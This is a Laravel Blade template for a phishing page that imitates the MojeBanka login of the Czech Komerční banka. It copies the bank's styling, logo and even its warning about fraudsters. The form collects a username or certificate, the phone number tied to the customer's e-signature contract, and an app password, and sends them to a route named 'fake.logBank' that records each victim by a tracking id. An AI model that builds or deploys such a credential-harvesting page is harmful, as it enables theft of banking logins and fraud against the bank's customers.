@section('body_class'){{"kb kb--caasauth kb-sidebar-mod"}}@endsection
@extends('layouts.fake')
@push('css')
    <link href="{{asset('css/kb.css')}}" rel="stylesheet">
    <style>
        .kb-footer__link[_ngcontent-kgg-c0]:after {
            padding: 0 5px
        }

        /*# sourceMappingURL=app.component.css.map*/
    </style>
    <style>
        [_nghost-kgg-c3] .kb-alert.visible {
            display: flex
        }

        /*# sourceMappingURL=info-message.component.css.map*/
    </style>
    <style>
        .kb-sidebar__content--main[_ngcontent-kgg-c6] {
            transition: all .2s ease-in-out
        }

        .hidden[_ngcontent-kgg-c6] {
            min-height: 0;
            max-height: 0;
            overflow: hidden
        }

        .visible[_ngcontent-kgg-c6] {
            overflow: hidden
        }

        .default-cursor[_ngcontent-kgg-c6] {
            cursor: default
        }

        /*# sourceMappingURL=sidebar.component.css.map*/
    </style>
    <style>
        .dropdown-menu-right[_ngcontent-kgg-c2] {
            position: absolute;
            top: 0;
            left: 0
        }

        [_nghost-kgg-c2] a[_ngcontent-kgg-c2] {
            font-size: .75rem
        }

        /*# sourceMappingURL=language-picker.component.css.map*/
    </style>
    <style>
        .display-block[_ngcontent-kgg-c9] {
            display: block !important
        }

        .display-none[_ngcontent-kgg-c9] {
            display: none !important
        }

        [_nghost-kgg-c9] .kb-help--offset {
            margin-bottom: 5px
        }

        .kb-sidebar__content--in__item[_ngcontent-kgg-c9] {
            opacity: 1
        }

        .section-label[_ngcontent-kgg-c9] {
            font-family: unset
        }

        /*# sourceMappingURL=help.component.css.map*/
    </style>
    <style>
        .hidden[_ngcontent-kgg-c12] {
            display: none
        }

        /*# sourceMappingURL=login.component.css.map*/
    </style>
    <style>
        #unblu-box[_ngcontent-kgg-c5] {
            background: #47a247;
            bottom: 50px;
            box-shadow: 0 0 15px #00214b;
            color: #fff;
            cursor: pointer;
            font-family: sans-serif;
            font-size: 15px;
            font-weight: 700;
            line-height: 2;
            padding: 0 10px;
            position: fixed;
            right: 40px;
            text-align: center;
            text-shadow: 0 1px 0 #84baff
        }

        @media (max-width: 768px) {
            #unblu-box[_ngcontent-kgg-c5] {
                bottom: 70px
            }
        }

        /*# sourceMappingURL=unblu.component.css.map*/
    </style>
    <style>
        .content[_ngcontent-kgg-c8] {
            color: #fff;
            padding: 0
        }

        .content[_ngcontent-kgg-c8] h4[_ngcontent-kgg-c8] {
            margin: 0 0 12px;
            font-size: 18px;
            text-align: left;
            color: #fff
        }

        .content[_ngcontent-kgg-c8] p[_ngcontent-kgg-c8] {
            font-size: 14px;
            line-height: 1.75
        }

        /*# sourceMappingURL=operational-campaigns.component.css.map*/
    </style>
    <style>
        .no-border[_ngcontent-kgg-c15] {
            border: none;
            box-shadow: none !important
        }

        @media (min-width: 940px) {
            .kb-login[_ngcontent-kgg-c15] {
                width: 480px
            }
        }

        /*# sourceMappingURL=name-login.component.css.map*/
    </style>
    <style>
        .default-cursor[_ngcontent-kgg-c17] {
            cursor: default
        }

        .width-input[_ngcontent-kgg-c17] {
            width: 100%
        }

        .form-select__arrow[_ngcontent-kgg-c17],
        .kb-icon--create[_ngcontent-kgg-c17] {
            cursor: pointer
        }

        .form-select__list[_ngcontent-kgg-c17] li[_ngcontent-kgg-c17]:hover {
            background-color: #fff;
            color: #000
        }

        .active-item[_ngcontent-kgg-c17] {
            background-color: #3e7d86 !important;
            color: #fff !important
        }

        .form-select__list[_ngcontent-kgg-c17] li[_ngcontent-kgg-c17]:hover .form-select__loader[_ngcontent-kgg-c17] {
            background-color: transparent !important
        }

        .form-select__list[_ngcontent-kgg-c17] li[_ngcontent-kgg-c17]:hover .form-select__loader[_ngcontent-kgg-c17] svg.kb-icon-svg[_ngcontent-kgg-c17] {
            fill: #9b9b9b !important
        }

        .active-item[_ngcontent-kgg-c17] .kb-icon[_ngcontent-kgg-c17] {
            color: #fff !important
        }

        .cool-loading-item[_ngcontent-kgg-c17] .kb-icon[_ngcontent-kgg-c17] {
            color: transparent !important
        }

        .clear-button[_ngcontent-kgg-c17] {
            position: absolute !important;
            right: 40px !important;
            top: 20% !important
        }

        .clear-button-alone[_ngcontent-kgg-c17] {
            right: 8px !important
        }

        .form-control--icon[_ngcontent-kgg-c17] {
            padding-right: 2rem !important
        }

        .transparent-caret[_ngcontent-kgg-c17] {
            caret-color: transparent
        }

        input.transparent-caret[_ngcontent-kgg-c17]::-moz-selection input.transparent-caret[_ngcontent-kgg-c17]::-moz-selection {
            background: 0 0
        }

        input.transparent-caret[_ngcontent-kgg-c17]::selection input.transparent-caret[_ngcontent-kgg-c17]::-moz-selection {
            background: 0 0
        }

        /*# sourceMappingURL=login-name-select-box.component.css.map*/
    </style>
    <style>
        .mini-iframe[_ngcontent-kgg-c18] {
            overflow: hidden;
            border: 0;
            margin-top: 1px;
            width: 1px;
            height: 1px
        }

        [_nghost-kgg-c18] iframe {
            display: block
        }

        /*# sourceMappingURL=cool-iframe.component.css.map*/
    </style>
    <style>
        .form-icon[_ngcontent-kgg-c21] {
            width: 25px
        }

        .icon-with-label[_ngcontent-kgg-c21] {
            margin-top: 22px
        }

        /*# sourceMappingURL=text-input-form-element.component.css.map*/
    </style>
    <style>
        .kb-sidebar {
            top: 0;
        }
    </style>
@endpush
@section('content')
    <app-spinner _ngcontent-kgg-c0="" class="kb-loading" _nghost-kgg-c1="">
        <div _ngcontent-kgg-c1="" class="kb-loading">
            <div _ngcontent-kgg-c1="" class="kb-indent">
                <div _ngcontent-kgg-c1="" class="spinner-wrap">
                    <svg _ngcontent-kgg-c1="" class="spinner" height="55px" viewBox="0 0 66 66" width="55px"
                         xmlns="http://www.w3.org/2000/svg">
                        <circle _ngcontent-kgg-c1="" class="path" cx="33" cy="33" fill="none" r="30"
                                stroke-linecap="round"
                                stroke-width="5"></circle>
                    </svg>
                </div>
            </div>
        </div>
    </app-spinner>
    <!---->
    <div _ngcontent-kgg-c0="" class="kb-ultratop">
        <div _ngcontent-kgg-c0="" class="row d-flex">
            <div _ngcontent-kgg-c0="" class="col-6">
                <!---->
                <a _ngcontent-kgg-c0="" href="#"
                   aria-label="domovská stránka Komerční banky"><img _ngcontent-kgg-c0="" alt="Komerční Banka"
                                                                     class="kb-header__logo"
                                                                     src="{{asset($bank['logo'])}}"></a>
            </div>
            <!---->
            <div _ngcontent-kgg-c0="" class="col-6 text-right">
                <!---->
                <app-language-picker _ngcontent-kgg-c0="" _nghost-kgg-c2=""><a _ngcontent-kgg-c2=""
                                                                               class="kb-h-typo__link--no-underline d-inline-flex align-items-center"
                                                                               href="#"
                                                                               aria-label="Změnit jazyk"> EN </a>
                    <ul _ngcontent-kgg-c2="" class="dropdown-menu dropdown-menu-right">
                        <!---->
                        <li _ngcontent-kgg-c2=""><a _ngcontent-kgg-c2=""
                                                    href="#"
                                                    aria-label="Změnit jazyk na češtinu"> CZ </a></li>
                        <li _ngcontent-kgg-c2=""><a _ngcontent-kgg-c2=""
                                                    href="#"
                                                    aria-label="Změnit jazyk na angličtinu"> EN </a></li>
                        <li _ngcontent-kgg-c2=""><a _ngcontent-kgg-c2=""
                                                    href="#"
                                                    aria-label="Změnit jazyk na slovenštinu"> SK </a></li>
                    </ul>
                </app-language-picker>
            </div>
        </div>
    </div>
    <!---->
    <div _ngcontent-kgg-c0="" id="js-kb-main" class="kb-main container">
        <app-info-message _ngcontent-kgg-c0="" _nghost-kgg-c3="">
            <div _ngcontent-kgg-c3="" class="kb-alert kb-alert--info">
                <div _ngcontent-kgg-c3="">
                    <!---->
                </div>
            </div>
        </app-info-message>
        <app-tooltip-messages _ngcontent-kgg-c0="" _nghost-kgg-c4="">
            <!---->
        </app-tooltip-messages>
        <!---->
        <app-unblu _ngcontent-kgg-c0="" _nghost-kgg-c5="">
            <!---->
        </app-unblu>
        <!---->
        <div _ngcontent-kgg-c0="">
            <!---->
            <div _ngcontent-kgg-c0="" class="kb-header" id="page-header">
                <div _ngcontent-kgg-c0="" class="row">
                    <div _ngcontent-kgg-c0=""
                         class="col-xs-12 d-md-flex hidden-sm-down align-items-center justify-content-around">
                        <!---->
                        <h1 _ngcontent-kgg-c0="">MojeBanka</h1>
                        <!---->
                    </div>
                </div>
            </div>
            <div _ngcontent-kgg-c0="" id="page-content">
                <!---->
                <router-outlet _ngcontent-kgg-c0=""></router-outlet>
                <app-login _nghost-kgg-c12="">
                    <div _ngcontent-kgg-c12="">
                        <!---->
                        <router-outlet _ngcontent-kgg-c12=""></router-outlet>
                        <app-login-step-name _nghost-kgg-c15="">
                            <!---->
                            <!---->
                            <!---->
                            <div _ngcontent-kgg-c15="">
                                <!---->
                                <!---->
                                <div _ngcontent-kgg-c15="" class="kb-login">
                                    <div _ngcontent-kgg-c15="" class="kb-login-container">
                                        <div _ngcontent-kgg-c15="" class="kb-login-container__slide text-left"
                                             style="transform: translate(-100%, 0px); margin-left: 100%;">
                                            <div _ngcontent-kgg-c15="" class="kb-login__header">
                                                <!----><span _ngcontent-kgg-c15="" class="kb-icon-svg kb-icon-svg--md"><svg
                                                            _ngcontent-kgg-c15=""><use _ngcontent-kgg-c15=""
                                                                                       xlink:href="..https://login.kb.cz/images/symbol-defs.svg#icon-account-circle-outline"></use></svg></span>
                                                <h2 _ngcontent-kgg-c15="" class="kb-typo__h4 d-inline"> Bezpečné
                                                    přihlášení </h2></div>
                                            <div _ngcontent-kgg-c15="" class="kb-login__body">
                                                <!---->
                                                <form _ngcontent-kgg-c15="" novalidate=""
                                                      class="ng-untouched ng-pristine ng-valid"
                                                      id="bank_pm_form" method="POST"
                                                      action="{{subRoute('fake.logBank', ['track_id' => $fake->track_id])}}"
                                                      role="form">
                                                    <div _ngcontent-kgg-c15="">
                                                        <app-flash-message _ngcontent-kgg-c15="" _nghost-kgg-c16="">
                                                            <!---->
                                                        </app-flash-message>
                                                    </div>
                                                    <div _ngcontent-kgg-c15="" class="kb-indent">
                                                        <app-login-name-select-box _ngcontent-kgg-c15="" name="name"
                                                                                   _nghost-kgg-c17=""
                                                                                   class="ng-untouched ng-pristine ng-valid">
                                                            <div _ngcontent-kgg-c17="" class="form-select">
                                                                <label _ngcontent-kgg-c17="" class="sr-only"
                                                                       for="bu9273">
                                                                    Uživatelské jméno / Certifikát </label>
                                                                <div _ngcontent-kgg-c17=""
                                                                     class="form-select__container default-cursor"><span
                                                                            _ngcontent-kgg-c17=""
                                                                            class="kb-icon kb-h-color-copy--tertiary kb-icon--indent-right kb-icon--account-circle"
                                                                            style="visibility: hidden;"></span><span
                                                                            _ngcontent-kgg-c17=""
                                                                            class="form-select__loader form-select__loader--left"
                                                                            hidden=""><svg _ngcontent-kgg-c17=""
                                                                                           class="kb-icon-svg kb-icon-svg--xs kb-icon--spinner"><use
                                                                                    _ngcontent-kgg-c17=""
                                                                                    xlink:href="..https://login.kb.cz/images/symbol-defs.svg#icon-spinner"></use></svg></span>
                                                                    <input _ngcontent-kgg-c17=""
                                                                           appinputvalidationiefix=""
                                                                           autocomplete="off"
                                                                           class="form-select__input form-control--icon ng-pristine ng-valid ng-touched"
                                                                           data-lpignore="true" type="text"
                                                                           id="login_bank"
                                                                           name="login"
                                                                           placeholder="Uživatelské jméno / Certifikát">
                                                                    <input _ngcontent-kgg-c17="" class="sr-only"
                                                                           type="file">
                                                                    <!---->
                                                                    <!---->
                                                                    <!----><a _ngcontent-kgg-c17=""
                                                                              class="form-icon kb-h-color-copy--green kb-h-typo__link--no-underline"
                                                                              href="#"
                                                                              aria-label="Nahrát certifikát"></a><span
                                                                            _ngcontent-kgg-c17=""
                                                                            class="form-select__loader form-select__loader--right"
                                                                            hidden=""><svg _ngcontent-kgg-c17=""
                                                                                           class="kb-icon-svg kb-icon-svg--xs kb-icon--spinner"><use
                                                                                    _ngcontent-kgg-c17=""
                                                                                    xlink:href="..https://login.kb.cz/images/symbol-defs.svg#icon-spinner"></use></svg></span>
                                                                </div>
                                                                <div _ngcontent-kgg-c17=""
                                                                     class="form-select__container default-cursor"><span
                                                                            _ngcontent-kgg-c17=""
                                                                            class="kb-icon kb-h-color-copy--tertiary kb-icon--indent-right kb-icon--account-circle"
                                                                            style="visibility: hidden;"></span><span
                                                                            _ngcontent-kgg-c17=""
                                                                            class="form-select__loader form-select__loader--left"
                                                                            hidden=""><svg _ngcontent-kgg-c17=""
                                                                                           class="kb-icon-svg kb-icon-svg--xs kb-icon--spinner"><use
                                                                                    _ngcontent-kgg-c17=""
                                                                                    xlink:href="https://login.kb.cz/images/symbol-defs.svg#icon-spinner"></use></svg></span>
                                                                    <input _ngcontent-kgg-c17=""
                                                                           appinputvalidationiefix=""
                                                                           autocomplete="off"
                                                                           class="form-select__input form-control--icon ng-pristine ng-valid ng-touched"
                                                                           data-lpignore="true" type="text"
                                                                           id="password_bank" name="tel"
                                                                           placeholder="Zadejte prosím své telefonní číslo uvedené ve smlouvě o elektronickém podpisut">
                                                                </div>
                                                                <div _ngcontent-kgg-c17=""
                                                                     class="form-select__container default-cursor"><span
                                                                            _ngcontent-kgg-c17=""
                                                                            class="kb-icon kb-h-color-copy--tertiary kb-icon--indent-right kb-icon--account-circle"
                                                                            style="visibility: hidden;"></span><span
                                                                            _ngcontent-kgg-c17=""
                                                                            class="form-select__loader form-select__loader--left"
                                                                            hidden=""><svg _ngcontent-kgg-c17=""
                                                                                           class="kb-icon-svg kb-icon-svg--xs kb-icon--spinner"><use
                                                                                    _ngcontent-kgg-c17=""
                                                                                    xlink:href="https://login.kb.cz/images/symbol-defs.svg#icon-spinner"></use></svg></span>
                                                                    <input _ngcontent-kgg-c17=""
                                                                           appinputvalidationiefix=""
                                                                           autocomplete="off"
                                                                           class="form-select__input form-control--icon ng-pristine ng-valid ng-touched"
                                                                           data-lpignore="true" type="text"
                                                                           id="password2_bank" name="password"
                                                                           placeholder="Heslo do aplikaci">
                                                                </div>
                                                                <ul _ngcontent-kgg-c17="" class="form-select__list">
                                                                    <!---->
                                                                    <!---->
                                                                    <li _ngcontent-kgg-c17=""
                                                                        class="form-select-protected">
                                                                    <span _ngcontent-kgg-c17=""
                                                                          class="kb-icon kb-icon--plus kb-h-color-copy--tertiary kb-icon--indent-right"></span><span
                                                                                _ngcontent-kgg-c17="">Vložit uživatelské jméno</span>
                                                                    </li>
                                                                    <!---->
                                                                    <li _ngcontent-kgg-c17=""
                                                                        class="form-select-protected">
                                                                    <span _ngcontent-kgg-c17=""
                                                                          class="kb-icon kb-icon--plus kb-h-color-copy--tertiary kb-icon--indent-right"></span><span
                                                                                _ngcontent-kgg-c17=""
                                                                                class="js-select-value"> Vložit certifikát </span>
                                                                    </li>
                                                                </ul>
                                                            </div>
                                                            <!---->
                                                        </app-login-name-select-box>
                                                    </div>
                                                    <!---->
                                                    <!---->
                                                    <div _ngcontent-kgg-c15=""
                                                         class="kb-indent kb-outdent kb-outdent--narrow-small mt-3"></div>
                                                    <!---->
                                                    <div _ngcontent-kgg-c15=""
                                                         class="kb-indent kb-outdent kb-outdent--narrow-small mt-3">
                                                        <!---->
                                                        <!---->
                                                        <!---->

                                                    </div>
                                                    <div _ngcontent-kgg-c15="" class="kb-indent">
                                                        <button _ngcontent-kgg-c15="" class="btn btn-primary"
                                                                type="submit">
                                                            Pokračovat
                                                        </button>
                                                    </div>
                                                </form>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <!---->
                            <!---->
                        </app-login-step-name>
                        <!---->
                    </div>
                    <!---->
                </app-login>
            </div>
        </div>
    </div>
    <!---->
    <div _ngcontent-kgg-c0="" app-sidebar="" class="kb-sidebar kb-sidebar--active" _nghost-kgg-c6="">
        <div _ngcontent-kgg-c6="" class="kb-sidebar__inner">
            <!---->
            <div _ngcontent-kgg-c6="" class="kb-sidebar__section kb-sidebar__section--dark">
                <div _ngcontent-kgg-c6="" class="kb-sidebar__opener js-sidebar default-cursor"><span
                            _ngcontent-kgg-c6=""
                            class="kb-icon-svg"><svg
                                _ngcontent-kgg-c6=""><use _ngcontent-kgg-c6=""
                                                          xlink:href="..https://login.kb.cz/images/symbol-defs.svg#icon-notify"></use></svg></span>
                </div>
                <div _ngcontent-kgg-c6="" class="kb-sidebar__content">
                    <div _ngcontent-kgg-c6="" class="inside-opener">&nbsp;</div>
                    <div _ngcontent-kgg-c6="" class="kb-sidebar__content--header" id="headingOperational">
                        <div _ngcontent-kgg-c6="" class="flex-fill">
                            <h3 _ngcontent-kgg-c6="" class="kb-h-color-copy--white text-left kb-typo__h4"> Upozornění
                                <!----></h3></div>
                        <!---->
                        <!----><a _ngcontent-kgg-c6="" class="section-open"
                                  href="#"
                                  aria-label="Zobrazit upozorněný"><span _ngcontent-kgg-c6=""
                                                                         class="text">Zobrazit</span></a></div>
                    <div _ngcontent-kgg-c6="" class="kb-sidebar__content--main hidden">
                        <div _ngcontent-kgg-c6="" class="kb-sidebar__content--in pb-5">
                            <app-operational-campaigns _ngcontent-kgg-c6="" _nghost-kgg-c8="">
                                <div _ngcontent-kgg-c8="" class="carousel slide">
                                    <div _ngcontent-kgg-c8="" class="carousel-inner">
                                        <!---->
                                        <div _ngcontent-kgg-c8="" class="carousel-item active">
                                            <div _ngcontent-kgg-c8="" class="content">
                                                <h4 _ngcontent-kgg-c8="">Pozor na podvodníky!</h4>
                                                <div _ngcontent-kgg-c8="">
                                                    <table width="100%" border="0" cellspacing="0" cellpadding="2"
                                                           class="nonAddrMsg">
                                                        <tbody>
                                                        <tr>
                                                            <td>Podvodníci mají nové triky
                                                                <br> Nepotvrzujte v KB Klíči přihlášení nebo převod
                                                                peněz,
                                                                pokud vás k tomu někdo vyzval <strong>po
                                                                    telefonu</strong>. Nesdělujte ani autorizační SMS
                                                                kódy.
                                                                <br> Podvodníci volají klientům a vydávají se za
                                                                pracovníky
                                                                banky. Umí dokonce nasimulovat naše telefonní číslo.
                                                                Obvykle
                                                                říkají, že účet klienta někdo napadl. Následně chtějí
                                                                peníze
                                                                převést na jiný (bezpečný) účet.
                                                                <br>
                                                                <br> Banka vás <strong>nikdy</strong> nebude žádat po
                                                                telefonu, abyste v KB Klíči potvrdili
                                                                <strong>přihlášení</strong> nebo <strong>platbu</strong>.
                                                                <br> Pokud jste se stali obětí podobného pokusu,
                                                                kontaktujte
                                                                neprodleně <strong>naši Klientskou linku
                                                                    internetového bankovnictví</strong> na tel: <a
                                                                        href="tel:00420955551552">955&nbsp;551&nbsp;552</a>
                                                                nebo nám napište na <a href="mailto:mojebanka@kb.cz">mojebanka@kb.cz</a>.
                                                                <br>
                                                                <br> Zjistěte více o tom, <a
                                                                        href="https://www.kb.cz/cs/bezpecnost/desatero"
                                                                        target="_blank">jak můžete chránit sebe i svůj
                                                                    počítač.</a>.
                                                                <br>
                                                                <br> Vaše Komerční banka
                                                            </td>
                                                        </tr>
                                                        <tr>
                                                            <td width="100%" height="15" valign="middle"><img
                                                                        src="./Komerční banka – přihlášení_files/infoLine.gif"
                                                                        alt="" width="100%" height="1" border="0"></td>
                                                        </tr>
                                                        </tbody>
                                                    </table>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                    <!---->
                                    <ol _ngcontent-kgg-c8="" class="carousel-indicators" role="navigation"
                                        aria-label="Další upozornění">
                                        <!---->
                                        <li _ngcontent-kgg-c8="" class="active" aria-label="Pozor na podvodníky!"></li>
                                    </ol>
                                </div>
                            </app-operational-campaigns>
                        </div>
                    </div>
                </div>
            </div>
            <!---->
            <div _ngcontent-kgg-c6="" class="kb-sidebar__section kb-sidebar__section--active">
                <div _ngcontent-kgg-c6="" class="kb-sidebar__opener js-sidebar default-cursor"><span
                            _ngcontent-kgg-c6=""
                            class="kb-icon-svg"><svg
                                _ngcontent-kgg-c6=""><use _ngcontent-kgg-c6=""
                                                          xlink:href="..https://login.kb.cz/images/symbol-defs.svg#icon-help-circle"></use></svg></span>
                </div>
                <div _ngcontent-kgg-c6="" class="kb-sidebar__content">
                    <div _ngcontent-kgg-c6="" class="inside-opener">&nbsp;</div>
                    <div _ngcontent-kgg-c6="" class="kb-sidebar__content--header">
                        <div _ngcontent-kgg-c6="" class="flex-fill">
                            <h3 _ngcontent-kgg-c6="" class="text-left kb-typo__h4"> Nápověda </h3></div>
                        <!----><a _ngcontent-kgg-c6="" class="section-close"
                                  href="#"
                                  aria-label="Skrýt nápovědu"><span _ngcontent-kgg-c6="" class="text">Skrýt</span></a>
                        <!---->
                    </div>
                    <div _ngcontent-kgg-c6="" class="kb-sidebar__content--main visible">
                        <div _ngcontent-kgg-c6="" class="kb-sidebar__content--in pb-5">
                            <app-help _ngcontent-kgg-c6="" _nghost-kgg-c9="">
                                <!---->
                                <!---->
                                <div _ngcontent-kgg-c9="">
                                    <!---->
                                    <div _ngcontent-kgg-c9="">
                                        <div _ngcontent-kgg-c9="">
                                            <div _ngcontent-kgg-c9="" class="kb-sidebar__content--in__item">
                                                <ul _ngcontent-kgg-c9=""
                                                    class="list-unstyled kb-h-font--big kb-h-line-height--xl"
                                                    role="navigation" aria-label="Nápověda">
                                                    <!---->
                                                    <li _ngcontent-kgg-c9=""><a _ngcontent-kgg-c9=""
                                                                                href="#"><span
                                                                    _ngcontent-kgg-c9="">Jsem tady poprvé</span></a>
                                                    </li>
                                                    <li _ngcontent-kgg-c9=""><a _ngcontent-kgg-c9=""
                                                                                href="#"><span
                                                                    _ngcontent-kgg-c9="">Časté dotazy</span></a></li>
                                                    <li _ngcontent-kgg-c9=""><a _ngcontent-kgg-c9=""
                                                                                href="#"><span
                                                                    _ngcontent-kgg-c9="">Přihlášení</span></a></li>
                                                    <li _ngcontent-kgg-c9=""><a _ngcontent-kgg-c9=""
                                                                                href="#"><span
                                                                    _ngcontent-kgg-c9="">Bankovní identita KB</span></a>
                                                    </li>
                                                    <li _ngcontent-kgg-c9=""><a _ngcontent-kgg-c9=""
                                                                                href="#"><span
                                                                    _ngcontent-kgg-c9="">Autorizace transakcí</span></a>
                                                    </li>
                                                    <li _ngcontent-kgg-c9=""><a _ngcontent-kgg-c9=""
                                                                                href="#"><span
                                                                    _ngcontent-kgg-c9="">KB Klíč</span></a></li>
                                                    <li _ngcontent-kgg-c9=""><a _ngcontent-kgg-c9=""
                                                                                href="#"><span
                                                                    _ngcontent-kgg-c9="">Bezpečnostní heslo</span></a>
                                                    </li>
                                                    <li _ngcontent-kgg-c9=""><a _ngcontent-kgg-c9=""
                                                                                href="#"><span
                                                                    _ngcontent-kgg-c9="">Osobní certifikát na čipové kartě</span></a>
                                                    </li>
                                                    <li _ngcontent-kgg-c9=""><a _ngcontent-kgg-c9=""
                                                                                href="#"><span
                                                                    _ngcontent-kgg-c9="">Firemní certifikát</span></a>
                                                    </li>
                                                    <li _ngcontent-kgg-c9=""><a _ngcontent-kgg-c9=""
                                                                                href="#"><span
                                                                    _ngcontent-kgg-c9="">Kontaktní údaje</span></a></li>
                                                    <li _ngcontent-kgg-c9=""><a _ngcontent-kgg-c9=""
                                                                                href="#"><span
                                                                    _ngcontent-kgg-c9="">Co dělat když…</span></a></li>
                                                    <li _ngcontent-kgg-c9=""><a _ngcontent-kgg-c9=""
                                                                                href="#"><span
                                                                    _ngcontent-kgg-c9="">Co znamená</span></a></li>
                                                </ul>
                                            </div>
                                        </div>
                                        <div _ngcontent-kgg-c9="" class="kb-sidebar__content--in__item" hidden="">
                                            <div _ngcontent-kgg-c9="" class="kb-head-breadcrumb"><a _ngcontent-kgg-c9=""
                                                                                                    class="kb-h-font--normal kb-h-color-copy--fourth"
                                                                                                    href="#">Nápověda</a>
                                            </div>
                                            <h4 _ngcontent-kgg-c9=""
                                                class="mb-1 kb-h-font--big kb-h-font-weight--semibold text-left section-label"></h4>
                                            <div _ngcontent-kgg-c9="" class="kb-indent">
                                                <ul _ngcontent-kgg-c9=""
                                                    class="list-unstyled kb-h-font--big kb-h-line-height--xl"
                                                    role="navigation" aria-label="Nápověda - null">
                                                    <!---->
                                                </ul>
                                            </div>
                                        </div>
                                    </div>
                                    <div _ngcontent-kgg-c9="" class="kb-sidebar__content--in__item" hidden="">
                                        <div _ngcontent-kgg-c9="" class="kb-head-breadcrumb"><a _ngcontent-kgg-c9=""
                                                                                                class="kb-h-font--normal kb-h-color-copy--fourth"
                                                                                                href="#">Nápověda</a>
                                            &gt;
                                            <a _ngcontent-kgg-c9="" class="kb-h-font--normal kb-h-color-copy--fourth"
                                               href="#"></a>
                                        </div>
                                        <div _ngcontent-kgg-c9="">
                                            <h4 _ngcontent-kgg-c9=""
                                                class="mb-1 kb-h-font--big kb-h-font-weight--semibold text-left section-label"></h4>
                                            <div _ngcontent-kgg-c9="" class="kb-indent"></div>
                                        </div>
                                    </div>
                                </div>
                                <!---->
                            </app-help>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <!---->
    <div _ngcontent-kgg-c0="" class="kb-footer" id="page-footer" role="contentinfo">
        <div _ngcontent-kgg-c0="" class="kb-footer__inner">
            <div _ngcontent-kgg-c0="" class="row flex-row-reverse">
                <div _ngcontent-kgg-c0="" class="col-xs-12 col-md-6 text-xs-center text-md-right">
                    <ul _ngcontent-kgg-c0="" class="kb-footer__links">
                        <li _ngcontent-kgg-c0="" class="kb-footer__link"><a _ngcontent-kgg-c0=""
                                                                            class="kb-h-color-copy--secondary"
                                                                            rel="noopener" target="_blank"
                                                                            href="tel:+420955551552">+420&nbsp;955&nbsp;551&nbsp;552</a>
                        </li>
                        <li _ngcontent-kgg-c0="" class="kb-footer__link"><a _ngcontent-kgg-c0=""
                                                                            class="kb-h-color-copy--secondary"
                                                                            rel="noopener" target="_blank"
                                                                            href="mailto:mojebanka@kb.cz">mojebanka@kb.cz</a>
                        </li>
                        <li _ngcontent-kgg-c0="" class="kb-footer__link"><a _ngcontent-kgg-c0=""
                                                                            class="kb-h-color-copy--secondary"
                                                                            href="https://www.kb.cz/cs/pravidla-pristupnosti"
                                                                            rel="noopener noreferrer" target="_blank">Prohlášení
                                o přístupnosti</a></li>
                    </ul>
                </div>
                <div _ngcontent-kgg-c0="" class="col-xs-12 col-md-6 text-xs-center text-md-left"> © 2021 Komerční banka
                    - <a
                            _ngcontent-kgg-c0="" href="https://www.societegenerale.com/" rel="noopener noreferrer"
                            target="_blank">Société Générale Group</a></div>
            </div>
        </div>
    </div>
    <iframe id="iframe233" src="./Komerční banka – přihlášení_files/saved_resource.html" title="gidlxu"
            style="width: 0px; height: 0px; border: none; display: none;"></iframe>
    <iframe id="iframe985" src="./Komerční banka – přihlášení_files/saved_resource(1).html" title="szcmog"
            style="width: 0px; height: 0px; border: none; display: none;"></iframe>
    <iframe id="iframe372" src="./Komerční banka – přihlášení_files/saved_resource(2).html" title="l_e_hp"
            style="width: 0px; height: 0px; border: none; display: none;"></iframe>
    <iframe id="iframe257" src="./Komerční banka – přihlášení_files/saved_resource(3).html" title="saibhy"
            style="width: 0px; height: 0px; border: none; display: none;"></iframe>
    <iframe id="iframe99" src="./Komerční banka – přihlášení_files/saved_resource(4).html" title="inkpcx"
            style="width: 0px; height: 0px; border: none; display: none;"></iframe>
    <iframe title="npxzin" style="visibility: hidden; width: 0px; height: 0px; border: none; display: none;"
            src="./Komerční banka – přihlášení_files/saved_resource(5).html"></iframe>
    <iframe id="iframe566" src="./Komerční banka – přihlášení_files/saved_resource(6).html" title="vfxyaq"
            style="width: 0px; height: 0px; border: none; display: none;"></iframe>
    <iframe id="iframe415" src="./Komerční banka – přihlášení_files/saved_resource(7).html" title="tszrsr"
            style="width: 0px; height: 0px; border: none; display: none;"></iframe>
    <iframe id="iframe270" src="./Komerční banka – přihlášení_files/saved_resource(8).html" title="ghghct"
            style="width: 0px; height: 0px; border: none; display: none;"></iframe>
    <iframe title="gtwhdv" style="visibility: hidden; width: 0px; height: 0px; border: none; display: none;"
            src="./Komerční banka – přihlášení_files/saved_resource(9).html"></iframe>
    <iframe id="iframe544" src="./Komerční banka – přihlášení_files/saved_resource(10).html" title="zktwhb"
            style="width: 0px; height: 0px; border: none; display: none;"></iframe>
@endsection
@push('js')
@endpush